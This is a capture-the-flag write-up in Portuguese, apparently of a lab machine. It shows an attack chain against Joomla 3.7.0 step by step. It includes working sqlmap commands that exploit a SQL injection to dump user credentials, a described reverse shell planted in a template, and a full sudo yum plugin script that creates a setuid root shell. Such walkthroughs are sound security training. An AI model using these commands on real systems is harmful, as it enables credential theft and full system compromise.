+++
title = "Daily Bugle"
date = "2026-07-24"
author = "berzrk"
description = "SQL injection no Joomla até RCE, depois root via sudo yum"
+++

# Enumeration

A partir do port scan conseguimos identificar uma página usando **Joomla** e um MySQL/MariaDB.

Seguindo o guia de [Joomla Discovery/Footprinting](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/joomla.html?highlight=joomla#discoveryfootprinting), conseguimos achar a versão em
`/administrator/manifests/files/joomla.xml`

Temos o **Joomla 3.7.0**

# Accessing Admin Dashboard

Com a versão em mãos, podemos procurar um exploit. Descobrimos que ele é vulnerável
a SQL Injection: `searchsploit -p php/webapps/42033.txt`

O exploit nos dá os primeiros comandos para usar com o `sqlmap`

```bash
export IP=192.168.1.1

# Find databases
sqlmap -u "http://$IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
--risk=3 --level=5 --random-agent --dbs -p list[fullordering]

# Find tables inside the DB 'joomla'
sqlmap -u "http://$IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
--risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla --tables

# Find the columns for the users table
sqlmap -u "http://$IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
--risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla \
-T "#__users" --columns

# Dump the username,password
sqlmap -u "http://$IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
--risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla -T "#__users" \
-C username,password --dump
```

Conseguimos um hash do usuário `jonah`, que podemos crackear. Com essas credenciais
conseguimos fazer login no dashboard.

# Shell as `apache`

Com acesso ao admin dashboard, conseguimos **RCE** modificando um template.

Encontramos o template que está em uso e inserimos uma reverse shell em um dos
arquivos (por exemplo, `index.php` do tema Protostar).

# Shell as `jjameson`

Olhando a configuração do Apache em `/var/www/html/configuration.php`, encontramos
credenciais que podemos usar para dar ssh no `jjameson` e pegar a primeira
flag.

# Shell as `root`

Rodando `sudo -l` temos:

```
User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

Com base no GTFOBins, conseguimos virar `root` com:

```bash
cat >/tmp/x<<EOF
[main]
plugins=1
pluginpath=/tmp/
pluginconfpath=/tmp/
EOF

cat >/tmp/y.conf<<EOF
[main]
enabled=1
EOF

cat >/tmp/y.py<<EOF
import yum
import os
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
 os.system('cp /bin/bash /tmp')
 os.system('chmod +s /tmp/bash')
EOF

sudo yum -c /tmp/x --enableplugin=y

/tmp/bash -p
# root
```
